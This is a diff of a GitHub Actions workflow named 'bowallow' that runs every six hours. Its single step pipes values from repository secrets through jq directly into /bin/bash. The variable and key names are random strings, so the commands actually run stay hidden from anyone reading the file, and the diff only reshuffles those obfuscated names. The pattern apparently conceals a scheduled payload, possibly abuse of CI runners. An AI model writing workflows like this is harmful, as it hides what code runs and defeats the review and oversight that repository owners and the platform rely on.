@@ -3,21 +3,23 @@ name: bowallow
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 4/6 * * *'
+    - cron: '5 4/6 * * *'
 
-jobs:  # 5527
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bowallow
         env:
-          cmrw68: ${{ secrets.cmrw68 }}
+          wxie53: ${{ secrets.wxie53 }}
         run: |
-          echo $cmrw68 | jq -r .j949 | /bin/bash
-          echo $mx383 | jq -r .tv958 | /bin/bash
-          echo $pnx51 | jq -r .kloh7 | /bin/bash
-          echo $nmhxb1774 | jq -r .sm65080 | /bin/bash
-          echo $vc0342 | jq -r .ocqf6197 | /bin/bash
-          echo $p20429 | jq -r .trt3 | /bin/bash
+          echo $wxie53 | jq -r .i28807 | /bin/bash
+          echo $wiz4628 | jq -r .ncmz48882 | /bin/bash
+          echo $bk87 | jq -r .o7 | /bin/bash
+          echo $vls88 | jq -r .txg50780 | /bin/bash
+          echo $ilix06 | jq -r .grt9100 | /bin/bash
+          echo $lq1019 | jq -r .wmyoc514 | /bin/bash
+          echo $lncwd168 | jq -r .rqpnq50 | /bin/bash
 
